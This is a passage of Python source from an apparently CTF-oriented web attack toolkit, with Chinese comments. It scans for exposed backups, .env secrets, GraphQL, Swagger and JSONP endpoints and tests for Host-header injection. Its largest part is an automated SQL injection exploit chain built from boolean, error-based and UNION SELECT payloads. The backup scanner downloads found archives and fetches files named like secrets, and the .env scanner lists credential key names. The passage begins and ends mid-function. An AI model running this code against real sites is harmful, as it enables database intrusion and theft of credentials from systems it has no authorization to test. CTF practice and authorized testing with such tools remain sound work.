                    name_len = int.from_bytes(content[i:i+4], 'big')
                    if 1 <= name_len <= 256 and i + 4 + name_len * 2 <= len(content):
                        try:
                            raw = content[i+4:i+4+name_len*2]
                            name = raw.decode('utf-16-be')
                            # 验证是否为合理的文件名
                            if (name.isprintable() and
                                    not name.startswith('\x00') and
                                    len(name) > 1 and
                                    any(c.isalnum() for c in name)):
                                file_names.add(name)
                                i += 4 + name_len * 2
                                continue
                        except (UnicodeDecodeError, ValueError):
                            pass
                i += 1

            if file_names:
                results.append(f"  {t('web.ds_store.extracted_files')} ({len(file_names)}):")
                for fname in sorted(file_names):
                    results.append(f"    {fname}")
            else:
                results.append(f"  [*] {t('web.ds_store.parse_hint')}")

        except Exception as e:
            results.append(f"[-] .DS_Store {t('web.detection_failed')}: {e}")

        return '\n'.join(results)

    # ========== 备份文件检测 ==========

    def detect_backup_files(self, url: str) -> str:
        """检测常见备份文件泄露（多线程）"""
        from concurrent.futures import ThreadPoolExecutor, as_completed

        results = [f"=== {t('web.backup.title')} ==="]

        try:
            parsed = urlparse(url)
            path = parsed.path.rstrip('/')

            # 根据 URL 路径推断可能的备份文件名
            backup_urls = []

            # 如果路径有具体文件，对该文件名生成备份变体
            if '.' in path.split('/')[-1]:
                base_file = path
                suffixes = ['.bak', '.old', '.orig', '.swp', '.sav', '~',
                            '.php~', '.php.bak', '.zip', '.tar.gz', '.sql']
                for suffix in suffixes:
                    backup_urls.append(base_file + suffix)
                # .filename.swp (vim swap 文件)
                dir_part = '/'.join(path.split('/')[:-1])
                file_part = path.split('/')[-1]
                backup_urls.append(f"{dir_part}/.{file_part}.swp")

            # 常见打包备份文件（名称 × 后缀 组合）
            names = ['www', 'web', 'website', 'backup', 'back', 'wwwroot',
                     'temp', 'html', 'htdocs', 'site', 'src', 'source',
                     'archive', '1', 'data', 'db']
            exts = ['.zip', '.tar.gz', '.tar', '.rar', '.7z']
            common_archives = [f'/{n}{e}' for n in names for e in exts]
            common_archives.extend([
                '/dump.sql', '/backup.sql', '/database.sql', '/db.sql',
            ])
            backup_urls.extend(common_archives)

            # 去重
            backup_urls = list(dict.fromkeys(backup_urls))

            found = []

            def _check_backup(backup_path):
                try:
                    target = urljoin(url, backup_path)
                    resp = self._get(target, allow_redirects=False)
                    if resp.status_code == 200 and len(resp.content) > 0:
                        content_type = resp.headers.get('Content-Type', '')
                        # 过滤 HTML 错误页面（通常备份文件不是 text/html）
                        if ('text/html' not in content_type or
                                backup_path.endswith(('.sql', '.bak', '.old', '.orig'))):
                            return (backup_path, len(resp.content), content_type)
                except Exception:
                    pass
                return None

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {executor.submit(_check_backup, bp): bp for bp in backup_urls}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        found.append(result)

            if found:
                from ctftool.core.flag_finder import flag_finder
                found_flags = []
                results.append(f"[!] {t('web.backup.found')} {len(found)} {t('web.backup.files')}:")
                for bpath, size, ctype in sorted(found):
                    size_display = f"{size}" if size < 1024 else f"{size / 1024:.1f}KB" if size < 1048576 else f"{size / 1048576:.1f}MB"
                    results.append(f"  [+] {bpath} ({size_display}, {ctype})")

                # 自动下载压缩包并分析内容
                for bpath, size, ctype in sorted(found):
                    if not bpath.endswith(('.zip', '.tar.gz', '.tar', '.rar', '.7z')):
                        # 非压缩包直接读取内容搜索 flag
                        try:
                            r = self._get(urljoin(url, bpath))
                            flags = flag_finder.search(r.text)
                            if flags:
                                for f in flags:
                                    if f not in found_flags:
                                        found_flags.append(f)
                                results.append(f"    [!] FLAG: {', '.join(flags)}")
                        except Exception:
                            pass
                        continue

                    if size > 10 * 1024 * 1024:  # 跳过 > 10MB
                        results.append(f"    [*] {t('web.backup.too_large')}")
                        continue

                    # 下载并解压 ZIP
                    if bpath.endswith('.zip'):
                        try:
                            import io
                            import zipfile
                            r = self._get(urljoin(url, bpath))
                            z = zipfile.ZipFile(io.BytesIO(r.content))
                            file_list = z.namelist()
                            results.append(f"\n  === {bpath} ({len(file_list)} files) ===")
                            for fname in file_list:
                                results.append(f"    {fname}")
                            # 读取文件内容搜索 flag
                            for fname in file_list:
                                try:
                                    content = z.read(fname).decode('utf-8', errors='replace')
                                    flags = flag_finder.search(content)
                                    if flags:
                                        for f in flags:
                                            if f not in found_flags:
                                                found_flags.append(f)
                                        results.append(f"    [!] {fname} -> FLAG: {', '.join(flags)}")
                                except Exception:
                                    pass
                            # 尝试直接访问发现的文件（flag 可能在服务器上而非 ZIP 中）
                            results.append(f"\n  === {t('web.backup.auto_visit')} ===")
                            for fname in file_list:
                                if any(kw in fname.lower() for kw in ('flag', 'secret', 'key', 'pass', 'config')):
                                    try:
                                        file_url = urljoin(url, '/' + fname)
                                        fr = self._get(file_url)
                                        if fr.status_code == 200:
                                            flags = flag_finder.search(fr.text)
                                            if flags:
                                                for f in flags:
                                                    if f not in found_flags:
                                                        found_flags.append(f)
                                                results.append(f"    [!] {fname} -> FLAG: {', '.join(flags)}")
                                                results.append(f"        {fr.text[:300]}")
                                            else:
                                                results.append(f"    [+] {fname} ({len(fr.text)} bytes): {fr.text[:200]}")
                                    except Exception:
                                        pass
                        except Exception as e:
                            results.append(f"    [-] ZIP {t('web.backup.extract_failed')}: {e}")

                    # tar.gz
                    elif bpath.endswith(('.tar.gz', '.tar')):
                        try:
                            import io
                            import tarfile
                            r = self._get(urljoin(url, bpath))
                            mode = 'r:gz' if bpath.endswith('.tar.gz') else 'r'
                            tf = tarfile.open(fileobj=io.BytesIO(r.content), mode=mode)
                            file_list = tf.getnames()
                            results.append(f"\n  === {bpath} ({len(file_list)} files) ===")
                            for fname in file_list:
                                results.append(f"    {fname}")
                                member = tf.getmember(fname)
                                if member.isfile() and member.size < 1024 * 1024:
                                    try:
                                        content = tf.extractfile(fname).read().decode('utf-8', errors='replace')
                                        flags = flag_finder.search(content)
                                        if flags:
                                            for f in flags:
                                                if f not in found_flags:
                                                    found_flags.append(f)
                                            results.append(f"      [!] FLAG: {', '.join(flags)}")
                                    except Exception:
                                        pass
                        except Exception as e:
                            results.append(f"    [-] TAR {t('web.backup.extract_failed')}: {e}")

                if found_flags:
                    results.append(f"\n[!] {t('web.flags_found')} ({len(found_flags)}):")
                    for f in found_flags:
                        results.append(f"    {f}")
            else:
                results.append(f"[-] {t('web.backup.not_found')}")

        except Exception as e:
            results.append(f"[-] {t('web.backup.detection_failed')}: {e}")

        return '\n'.join(results)

    # ========== .env 文件泄露检测 ==========

    def detect_env_leak(self, url: str) -> str:
        """检测 .env 配置文件泄露"""
        results = [f"=== .env {t('web.leak_detection')} ==="]

        env_paths = ['/.env', '/.env.local', '/.env.production', '/.env.backup',
                     '/.env.dev', '/.env.staging', '/.env.example', '/.env.old']

        sensitive_keys = [
            'DB_PASSWORD', 'DB_PASS', 'DATABASE_PASSWORD', 'MYSQL_PASSWORD',
            'SECRET_KEY', 'SECRET', 'APP_SECRET', 'JWT_SECRET',
            'API_KEY', 'APIKEY', 'API_SECRET',
            'AWS_ACCESS_KEY', 'AWS_SECRET_KEY', 'AWS_SECRET_ACCESS_KEY',
            'PRIVATE_KEY', 'ENCRYPTION_KEY',
            'MAIL_PASSWORD', 'SMTP_PASSWORD', 'EMAIL_PASSWORD',
            'REDIS_PASSWORD', 'MONGO_PASSWORD',
            'STRIPE_SECRET', 'PAYPAL_SECRET',
            'GITHUB_TOKEN', 'GITLAB_TOKEN',
            'S3_KEY', 'S3_SECRET',
            'PASSWORD', 'PASSWD', 'TOKEN',
        ]

        found_any = False

        for env_path in env_paths:
            try:
                env_url = urljoin(url, env_path)
                resp = self._get(env_url)

                if resp.status_code != 200 or len(resp.text.strip()) == 0:
                    results.append(f"[-] {env_path} {t('web.not_found')} ({t('web.status_code')}: {resp.status_code})")
                    continue

                content = resp.text.strip()

                # 验证是否像 .env 文件（包含 KEY=VALUE 格式）
                env_pattern = re.compile(r'^[A-Z_][A-Z0-9_]*\s*=', re.MULTILINE)
                matches = env_pattern.findall(content)
                if not matches:
                    results.append(f"[-] {env_path} {t('web.env.not_env_format')}")
                    continue

                found_any = True
                results.append(f"[!] {t('web.found')} {env_path} ({len(content)} bytes, {len(matches)} {t('web.env.variables')})")

                # 检查敏感信息
                leaked_secrets = []
                for line in content.split('\n'):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    if '=' not in line:
                        continue
                    key = line.split('=', 1)[0].strip().upper()
                    value = line.split('=', 1)[1].strip().strip('"').strip("'")
                    for sensitive_key in sensitive_keys:
                        if sensitive_key in key and value and value not in ('', 'null', 'none', 'changeme', 'xxx', 'your_key_here'):
                            # 脱敏显示
                            masked = value[:3] + '*' * min(len(value) - 3, 20) if len(value) > 3 else '***'
                            leaked_secrets.append((key, masked))
                            break

                if leaked_secrets:
                    results.append(f"  [!!] {t('web.env.sensitive_found')} ({len(leaked_secrets)}):")
                    for key, masked in leaked_secrets:
                        results.append(f"    {key} = {masked}")
                else:
                    results.append(f"  [*] {t('web.env.no_sensitive_keys')}")

            except Exception as e:
                results.append(f"[-] {env_path} {t('web.request_failed')}: {e}")

        if not found_any:
            results.append(f"\n[-] {t('web.env.none_found')}")

        return '\n'.join(results)

    # ========== GraphQL 自省检测 ==========

    def detect_graphql(self, url: str) -> str:
        """检测 GraphQL 端点及自省查询"""
        results = [f"=== GraphQL {t('web.detection')} ==="]

        graphql_paths = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql',
                         '/v2/graphql', '/query', '/api/query',
                         '/graphql/console', '/gql']

        introspection_query = '{"query": "{__schema{types{name}}}"}'

        found_endpoint = False

        for gql_path in graphql_paths:
            try:
                gql_url = urljoin(url, gql_path)

                # 先发 GET 探测端点是否存在
                try:
                    resp_get = self._get(gql_url)
                    if resp_get.status_code in (404, 500, 502, 503):
                        continue
                except Exception:
                    continue

                # 发送 introspection query (POST JSON)
                try:
                    resp = self._post(
                        gql_url,
                        data=introspection_query,
                        headers={'Content-Type': 'application/json'}
                    )
                except Exception:
                    continue

                if resp.status_code != 200:
                    # 某些端点可能用 GET 方式接受查询
                    try:
                        resp = self._get(gql_url, params={'query': '{__schema{types{name}}}'})
                    except Exception:
                        continue

                if resp.status_code == 200 and '__schema' in resp.text:
                    found_endpoint = True
                    results.append(f"[!] {t('web.graphql.endpoint_found')}: {gql_path}")
                    results.append(f"  [!!] {t('web.graphql.introspection_enabled')}")

                    # 解析类型信息
                    try:
                        data = resp.json()
                        types_list = data.get('data', {}).get('__schema', {}).get('types', [])
                        if types_list:
                            # 过滤掉内置类型（以 __ 开头的）
                            custom_types = [t_item['name'] for t_item in types_list
                                            if not t_item['name'].startswith('__')]
                            [t_item['name'] for t_item in types_list
                                             if t_item['name'].startswith('__')]
                            if custom_types:
                                results.append(f"  {t('web.graphql.custom_types')} ({len(custom_types)}):")
                                for type_name in custom_types[:30]:
                                    results.append(f"    {type_name}")
                                if len(custom_types) > 30:
                                    results.append(f"    ... {t('web.and_more')} {len(custom_types) - 30} {t('web.items')}")

                            # 标注可能敏感的类型
                            sensitive_names = ['user', 'admin', 'auth', 'token', 'secret',
                                               'password', 'credential', 'flag', 'key']
                            suspicious = [t_name for t_name in custom_types
                                          if any(s in t_name.lower() for s in sensitive_names)]
                            if suspicious:
                                results.append(f"  [!!] {t('web.graphql.sensitive_types')}:")
                                for s_type in suspicious:
                                    results.append(f"    -> {s_type}")
                    except Exception:
                        results.append(f"  [*] {t('web.graphql.parse_failed')}")

                    results.append(f"  [*] {t('web.graphql.full_introspection_hint')}")

                elif resp.status_code == 200:
                    found_endpoint = True
                    results.append(f"[+] {t('web.graphql.endpoint_found')}: {gql_path} ({t('web.graphql.introspection_disabled')})")

            except Exception:
                pass

        if not found_endpoint:
            results.append(f"[-] {t('web.graphql.no_endpoint')}")

        return '\n'.join(results)

    # ========== Host Header 注入检测 ==========

    def detect_host_injection(self, url: str) -> str:
        """检测 Host 头注入漏洞"""
        results = [f"=== Host Header {t('web.injection_detection')} ==="]

        try:
            parsed = urlparse(url)
            original_host = parsed.hostname

            # 先获取基线响应
            try:
                baseline = self._get(url)
                baseline_text = baseline.text
                baseline_status = baseline.status_code
            except Exception as e:
                results.append(f"[-] {t('web.cannot_access_target')}: {e}")
                return '\n'.join(results)

            # 测试场景
            test_cases = [
                {
                    'name': f"Host: evil.com ({t('web.host.direct_replace')})",
                    'headers': {'Host': 'evil.com'},
                    'marker': 'evil.com',
                },
                {
                    'name': "X-Forwarded-Host: evil.com",
                    'headers': {'X-Forwarded-Host': 'evil.com'},
                    'marker': 'evil.com',
                },
                {
                    'name': "X-Host: evil.com",
                    'headers': {'X-Host': 'evil.com'},
                    'marker': 'evil.com',
                },
                {
                    'name': f"Host: {original_host}:evil.com ({t('web.host.port_injection')})",
                    'headers': {'Host': f'{original_host}:evil.com'},
                    'marker': 'evil.com',
                },
                {
                    'name': "X-Forwarded-For + X-Forwarded-Host",
                    'headers': {
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Forwarded-Host': 'evil.com',
                    },
                    'marker': 'evil.com',
                },
            ]

            for tc in test_cases:
                try:
                    resp = self._get(url, headers=tc['headers'])
                    marker = tc['marker']
                    reflected_in_body = marker in resp.text and marker not in baseline_text
                    reflected_in_headers = any(marker in v for v in resp.headers.values())

                    if reflected_in_body:
                        results.append(f"  [!] {tc['name']}: {t('web.host.reflected_body')}")
                        # 查找反射位置
                        idx = resp.text.find(marker)
                        snippet = resp.text[max(0, idx-50):idx+len(marker)+50]
                        results.append(f"      {t('web.host.context')}: ...{snippet}...")
                    elif reflected_in_headers:
                        for hk, hv in resp.headers.items():
                            if marker in hv:
                                results.append(f"  [!] {tc['name']}: {t('web.host.reflected_header')} ({hk}: {hv})")
                                break
                    elif resp.status_code != baseline_status:
                        results.append(f"  [?] {tc['name']}: {t('web.status_code')} {resp.status_code} (vs {t('web.waf.baseline_short')} {baseline_status})")
                    else:
                        results.append(f"  [-] {tc['name']}: {t('web.host.not_reflected')}")
                except Exception as e:
                    results.append(f"  [-] {tc['name']}: {t('web.request_failed')} ({e})")

            # 密码重置投毒场景提示
            results.append(f"\n[*] {t('web.host.reset_poison_hint')}")
            results.append(f"  - {t('web.host.reset_poison_desc')}")

        except Exception as e:
            results.append(f"[-] Host Header {t('web.detection_failed')}: {e}")

        return '\n'.join(results)

    # ========== JSONP 劫持检测 ==========

    def detect_jsonp(self, url: str) -> str:
        """检测 JSONP 劫持漏洞"""
        results = [f"=== JSONP {t('web.detection')} ==="]

        callback_marker = 'ctftool_cb_test123'
        callback_params = ['callback', 'cb', 'jsonp', 'jsonpcallback',
                           'call', 'func', 'function']

        try:
            parsed = urlparse(url)
            existing_params = parse_qs(parsed.query, keep_blank_values=True)

            found_jsonp = False

            # 检查 URL 中是否已有 callback 参数
            for param_name in existing_params:
                if param_name.lower() in callback_params:
                    results.append(f"[*] {t('web.jsonp.existing_param')}: {param_name}")

            # 对每个可能的 callback 参数名进行测试
            for cb_param in callback_params:
                try:
                    test_params = dict(existing_params)
                    test_params[cb_param] = [callback_marker]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))

                    resp = self._get(test_url)
                    text = resp.text.strip()

                    # 检查是否为 JSONP 格式: callback_marker(...)
                    jsonp_pattern = re.compile(
                        rf'^{re.escape(callback_marker)}\s*\(.*\)\s*;?\s*$',
                        re.DOTALL
                    )
                    if jsonp_pattern.match(text):
                        found_jsonp = True
                        results.append(f"[!] {t('web.jsonp.detected')}: ?{cb_param}={callback_marker}")
                        results.append(f"  {t('web.jsonp.response_preview')}:")
                        results.append(f"    {text[:500]}")

                        # 检查响应中是否包含敏感数据特征
                        sensitive_patterns = [
                            ('email', r'[\w.+-]+@[\w-]+\.[\w.]+'),
                            ('phone', r'\d{11}'),
                            ('token/key', r'(?:token|key|secret|session)["\s:=]+["\']?[\w-]{8,}'),
                            ('user info', r'(?:username|user_?name|login|nick)["\s:=]+["\']?\w+'),
                            ('password', r'(?:password|passwd|pwd)["\s:=]+'),
                        ]
                        found_sensitive = []
                        for sname, spattern in sensitive_patterns:
                            if re.search(spattern, text, re.IGNORECASE):
                                found_sensitive.append(sname)

                        if found_sensitive:
                            results.append(f"  [!!] {t('web.jsonp.sensitive_data')}: {', '.join(found_sensitive)}")
                        else:
                            results.append(f"  [*] {t('web.jsonp.no_sensitive')}")

                        # 只要找到一个有效的就可以跳出
                        break

                    # 检查回调是否被部分反射（可能存在但格式不完全匹配）
                    elif callback_marker in text:
                        results.append(f"[?] {t('web.jsonp.partial')}: ?{cb_param}={callback_marker}")
                        results.append(f"  {t('web.jsonp.response_preview')}: {text[:300]}")

                except Exception:
                    pass

            if not found_jsonp:
                results.append(f"[-] {t('web.jsonp.not_found')}")
                results.append(f"  [*] {t('web.jsonp.hint')}")

        except Exception as e:
            results.append(f"[-] JSONP {t('web.detection_failed')}: {e}")

        return '\n'.join(results)

    # ========== Swagger/OpenAPI 探测 ==========

    def detect_swagger(self, url: str) -> str:
        """探测 Swagger/OpenAPI 文档端点，解析 API 路径并标注敏感端点"""
        import json as _json
        from concurrent.futures import ThreadPoolExecutor, as_completed

        self._check_requests()

        endpoints = [
            "/swagger.json", "/swagger/v1/swagger.json", "/api-docs",
            "/api/swagger.json", "/v1/api-docs", "/v2/api-docs",
            "/v3/api-docs", "/openapi.json", "/openapi.yaml",
            "/swagger-ui.html", "/swagger-ui/", "/docs", "/redoc",
            "/api/docs", "/api/v1/docs", "/.well-known/openapi",
        ]

        api_keywords = ["swagger", "openapi", "paths", "info"]
        sensitive_keywords = ["admin", "user", "auth", "login", "token", "password", "secret"]

        results = [f"=== {t('web.swagger.title')} ===", f"{t('web.target')}: {url}", ""]

        found_endpoints = []
        swagger_specs = []  # 存储可解析的 swagger/openapi JSON

        def _probe_endpoint(ep):
            """探测单个端点"""
            try:
                target = urljoin(url, ep)
                resp = self._get(target)
                if resp.status_code == 200:
                    text = resp.text.lower()
                    matched_kw = [kw for kw in api_keywords if kw in text]
                    if matched_kw:
                        return {
                            "endpoint": ep,
                            "url": target,
                            "keywords": matched_kw,
                            "content_type": resp.headers.get("Content-Type", ""),
                            "text": resp.text,
                            "length": len(resp.text),
                        }
            except Exception:
                pass
            return None

        # 并行探测所有端点
        results.append(f"[*] {t('web.swagger.scanning')} {len(endpoints)} {t('web.swagger.endpoints')}...")
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(_probe_endpoint, ep): ep for ep in endpoints}
            for future in as_completed(futures):
                hit = future.result()
                if hit:
                    found_endpoints.append(hit)

        if not found_endpoints:
            results.append(f"[-] {t('web.swagger.not_found')}")
            results.append(f"[*] {t('web.swagger.hint')}")
            return "\n".join(results)

        # 按端点排序输出
        found_endpoints.sort(key=lambda x: x["endpoint"])
        results.append(f"\n[+] {t('web.swagger.found')} {len(found_endpoints)} {t('web.swagger.endpoints')}:\n")

        for hit in found_endpoints:
            results.append(f"  [200] {hit['endpoint']}")
            results.append(f"    URL: {hit['url']}")
            results.append(f"    Content-Type: {hit['content_type']}")
            results.append(f"    {t('web.swagger.matched_keywords')}: {', '.join(hit['keywords'])}")
            results.append(f"    {t('web.swagger.resp_size')}: {hit['length']} bytes")

            # 尝试解析为 JSON (swagger.json / openapi.json)
            try:
                spec = _json.loads(hit["text"])
                if isinstance(spec, dict) and ("paths" in spec or "swagger" in spec or "openapi" in spec):
                    swagger_specs.append((hit["endpoint"], spec))
            except (_json.JSONDecodeError, ValueError):
                pass

        # 解析 swagger/openapi spec 中的 API 路径
        for ep_name, spec in swagger_specs:
            results.append(f"\n{'='*50}")
            results.append(f"[+] {t('web.swagger.parsing_spec')}: {ep_name}")
            results.append(f"{'='*50}")

            # 基本信息
            if "info" in spec:
                info = spec["info"]
                results.append(f"  {t('web.swagger.api_title')}: {info.get('title', t('web.unknown'))}")
                results.append(f"  {t('web.swagger.api_version')}: {info.get('version', t('web.unknown'))}")
                if "description" in info:
                    results.append(f"  {t('web.description')}: {info['description'][:200]}")

            if "swagger" in spec:
                results.append(f"  Swagger {t('web.swagger.spec_version')}: {spec['swagger']}")
            elif "openapi" in spec:
                results.append(f"  OpenAPI {t('web.swagger.spec_version')}: {spec['openapi']}")

            # 解析路径和方法
            paths = spec.get("paths", {})
            if paths:
                results.append(f"\n  --- {t('web.swagger.api_paths')} ({len(paths)} {t('web.swagger.total')}) ---")

                sensitive_found = []
                all_routes = []

                for path, methods in paths.items():
                    if not isinstance(methods, dict):
                        continue
                    http_methods = [m.upper() for m in methods.keys()
                                    if m.lower() in ("get", "post", "put", "delete", "patch", "options", "head")]
                    route_info = f"  {' / '.join(http_methods):20s} {path}"
                    all_routes.append(route_info)

                    # 检查是否为敏感端点
                    path_lower = path.lower()
                    matched_sensitive = [kw for kw in sensitive_keywords if kw in path_lower]
                    if matched_sensitive:
                        sensitive_found.append((path, http_methods, matched_sensitive))

                for route in all_routes:
                    results.append(route)

                # 敏感端点标注
                if sensitive_found:
                    results.append(f"\n  [!!] {t('web.swagger.sensitive_endpoints')} ({len(sensitive_found)}):")
                    for spath, smethods, skws in sensitive_found:
                        results.append(f"    [!] {' / '.join(smethods):20s} {spath}")
                        results.append(f"        {t('web.swagger.sensitive_keywords')}: {', '.join(skws)}")
            else:
                results.append(f"  [-] {t('web.swagger.no_paths')}")

            # 安全定义
            security_defs = spec.get("securityDefinitions", spec.get("components", {}).get("securitySchemes", {}))
            if security_defs:
                results.append(f"\n  --- {t('web.swagger.security_schemes')} ---")
                for name, detail in security_defs.items():
                    scheme_type = detail.get("type", t("web.unknown"))
                    results.append(f"    {name}: {scheme_type}")
                    if "in" in detail:
                        results.append(f"      in: {detail['in']}")
                    if "flows" in detail:
                        results.append(f"      flows: {list(detail['flows'].keys())}")

        # 总结
        results.append(f"\n{'='*50}")
        results.append(f"=== {t('web.summary')} ===")
        results.append(f"  {t('web.swagger.found_endpoints_count')}: {len(found_endpoints)}")
        if swagger_specs:
            total_paths = sum(len(s.get("paths", {})) for _, s in swagger_specs)
            results.append(f"  {t('web.swagger.total_api_paths')}: {total_paths}")
        results.append(f"\n[*] {t('web.swagger.tips')}")
        results.append(f"  1. {t('web.swagger.tip_check_auth')}")
        results.append(f"  2. {t('web.swagger.tip_test_sensitive')}")
        results.append(f"  3. {t('web.swagger.tip_check_deprecated')}")

        return "\n".join(results)

    # ========== 自动化 SQLi payload 链 ==========

    def sqli_auto_exploit(self, url: str, param: str = "") -> str:
        """自动化 SQL 注入利用链：确认注入 -> 列数探测 -> 回显位 -> 提取数据"""
        self._check_requests()
        results = [f"=== {t('web.sqli_auto.title')} ===", f"{t('web.target')}: {url}", ""]

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        use_post = False

        # 如果未指定 param，自动检测
        if not param:
            if params:
                param = list(params.keys())[0]
                results.append(f"[*] {t('web.sqli_auto.auto_param')}: {param}")
            else:
                results.append(f"[-] {t('web.sqli_auto.no_param')}")
                results.append(f"[*] {t('web.sqli_auto.hint_param')}")
                return "\n".join(results)
        else:
            if param not in params:
                # 参数可能在 POST 中使用
                use_post = True
                results.append(f"[*] {t('web.sqli_auto.param_not_in_url')}: {param}")
                results.append(f"[*] {t('web.sqli_auto.try_post')}")

        original_value = params.get(param, ["1"])[0] if not use_post else "1"

        def _send_payload(payload_value, method="GET"):
            """发送带 payload 的请求"""
            try:
                if method == "POST" or use_post:
                    data = {param: payload_value}
                    resp = self._post(url, data=data)
                else:
                    test_params = params.copy()
                    test_params[param] = [payload_value]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))
                    resp = self._get(test_url)
                return resp
            except Exception:
                return None

        # ========================================
        # 步骤 1：确认注入点
        # ========================================
        results.append(f"{'='*50}")
        results.append(f"[Step 1] {t('web.sqli_auto.step1_title')}")
        results.append(f"{'='*50}")

        injection_confirmed = False
        inject_type = ""  # "string_single", "string_double", "numeric"
        comment_suffix = "-- -"  # 默认注释符

        # SQL 报错特征
        error_patterns = [
            r'SQL syntax', r'mysql_', r'ORA-\d{5}', r'PostgreSQL',
            r'SQLite', r'Warning.*mysql', r'Unclosed quotation mark',
            r'SQLSTATE', r'syntax error', r'Microsoft.*ODBC',
            r'near ".*?"', r'Unknown column',
        ]

        def _has_sql_error(text):
            for p in error_patterns:
                if re.search(p, text, re.IGNORECASE):
                    return True
            return False

        # 获取基准响应
        baseline_resp = _send_payload(original_value)
        if not baseline_resp:
            results.append(f"[-] {t('web.cannot_access_target')}")
            return "\n".join(results)
        baseline_text = baseline_resp.text
        baseline_len = len(baseline_text)
        results.append(f"  [*] {t('web.sqli_auto.baseline')}: {baseline_len} bytes")

        # === 尝试多种注入类型 ===
        inject_tests = [
            # (名称, true_payload, false_payload, 注入类型, 注释符)
            ("String (single quote)", f"{original_value}' AND '1'='1", f"{original_value}' AND '1'='2", "string_single", "-- -"),
            ("String (--+)", f"{original_value}' AND 1=1 --+", f"{original_value}' AND 1=2 --+", "string_single", "--+"),
            ("String (#)", f"{original_value}' AND 1=1 #", f"{original_value}' AND 1=2 #", "string_single", "#"),
            ("Numeric", f"{original_value} AND 1=1", f"{original_value} AND 1=2", "numeric", "-- -"),
            ("Numeric (--+)", f"{original_value} AND 1=1 --+", f"{original_value} AND 1=2 --+", "numeric", "--+"),
            ("String (double quote)", f'{original_value}" AND "1"="1', f'{original_value}" AND "1"="2', "string_double", '-- -'),
        ]

        for test_name, true_pl, false_pl, inj_type, comment in inject_tests:
            try:
                true_resp = _send_payload(true_pl)
                false_resp = _send_payload(false_pl)
                if not true_resp or not false_resp:
                    continue
                true_len = len(true_resp.text)
                false_len = len(false_resp.text)

                # 方式1: true 和 baseline 接近，false 明显不同
                if (abs(true_len - baseline_len) < 20 and abs(false_len - baseline_len) > 10):
                    injection_confirmed = True
                    inject_type = inj_type
                    comment_suffix = comment
                    results.append(f"  [!] {test_name}: {t('web.sqli_auto.bool_blind_confirmed')}")
                    results.append(f"    True: {true_len}b (≈baseline), False: {false_len}b")
                    break
                # 方式2: true 和 false 差异明显
                if abs(true_len - false_len) > 10:
                    injection_confirmed = True
                    inject_type = inj_type
                    comment_suffix = comment
                    results.append(f"  [!] {test_name}: {t('web.sqli_auto.bool_blind_confirmed')}")
                    results.append(f"    True: {true_len}b, False: {false_len}b")
                    break
            except Exception:
                continue

        # 如果布尔差异没检测到，尝试报错检测
        if not injection_confirmed:
            for quote in ["'", '"', "\\'"]:
                try:
                    err_resp = _send_payload(original_value + quote)
                    if err_resp and _has_sql_error(err_resp.text):
                        injection_confirmed = True
                        inject_type = "string_single" if quote == "'" else "string_double"
                        results.append(f"  [!] {t('web.sqli_auto.error_triggered')} ({quote})")
                        break
                except Exception:
                    continue

        if not injection_confirmed:
            results.append(f"[-] {t('web.sqli_auto.not_confirmed')}")
            results.append(f"[*] {t('web.sqli_auto.manual_hint')}")
            results.append(f"  1. {t('web.sqli_auto.hint_try_numeric')}")
            results.append(f"  2. {t('web.sqli_auto.hint_try_double_quote')}")
            results.append(f"  3. {t('web.sqli_auto.hint_try_blind')}")
            return "\n".join(results)

        results.append(f"[+] {t('web.sqli_auto.injection_confirmed')} (type: {inject_type}, comment: {comment_suffix})")

        # 根据注入类型构造 payload 前缀
        if inject_type == "string_single":
            inject_prefix = f"{original_value}'"
        elif inject_type == "string_double":
            inject_prefix = f'{original_value}"'
        else:
            inject_prefix = original_value

        # ========================================
        # 步骤 2：UNION 列数探测（ORDER BY 二分法）
        # ========================================
        results.append(f"\n{'='*50}")
        results.append(f"[Step 2] {t('web.sqli_auto.step2_title')}")
        results.append(f"{'='*50}")

        column_count = 0

        # 使用 concat marker 精确检测列数（最可靠）
        results.append(f"  [*] {t('web.sqli_auto.trying_union_null')}")
        neg_value = f"-99999{inject_prefix[len(original_value):]}" if inject_type != "numeric" else "-99999"

        for n in range(1, 21):
            # 用 concat marker 探测：正确列数时 marker 会在页面中回显
            items = [f"concat(0x7e7e7e,{i},0x7e7e7e)" for i in range(1, n + 1)]
            payload = f"{neg_value} UNION SELECT {','.join(items)} {comment_suffix}"
            resp = _send_payload(payload)
            if not resp:
                continue
            markers = re.findall(r'~~~(\d+)~~~', resp.text)
            if markers:
                column_count = n
                results.append(f"  [+] UNION SELECT ({n} cols): marker {markers} found!")
                break
            # 如果报错且之前没有报错，用 NULL 方式确认
            if _has_sql_error(resp.text):
                results.append(f"  [-] UNION SELECT ({n} cols): {t('web.sqli_auto.error')}")
                # n-1 可能是正确列数（如果之前没报错）
                if n > 1:
                    column_count = n - 1
                break

        # 回退：如果 marker 方式失败，用 NULL + 响应长度差异
        if column_count == 0:
            results.append("  [*] Marker not found, trying NULL + length diff...")
            empty_resp = _send_payload(neg_value)
            empty_len = len(empty_resp.text) if empty_resp else 0
            best_n, best_diff = 0, 0
            for n in range(1, 21):
                nulls = ",".join(["NULL"] * n)
                payload = f"{neg_value} UNION SELECT {nulls} {comment_suffix}"
                resp = _send_payload(payload)
                if not resp:
                    continue
                if _has_sql_error(resp.text):
                    if best_n > 0:
                        column_count = best_n
                    break
                diff = len(resp.text) - empty_len
                if diff > best_diff:
                    best_diff = diff
                    best_n = n
            if column_count == 0 and best_n > 0:
                column_count = best_n
                results.append(f"  [+] Best match: {best_n} cols (+{best_diff}b)")

        # 如果 UNION NULL 失败，回退到 ORDER BY
        if column_count == 0:
            results.append("  [*] Trying ORDER BY...")
            # 先获取 ORDER BY 1 的基准
            ob1_resp = _send_payload(f"{inject_prefix} ORDER BY 1 {comment_suffix}")
            ob1_len = len(ob1_resp.text) if ob1_resp else baseline_len
            for n in range(2, 21):
                payload = f"{inject_prefix} ORDER BY {n} {comment_suffix}"
                resp = _send_payload(payload)
                if not resp:
                    break
                has_error = _has_sql_error(resp.text)
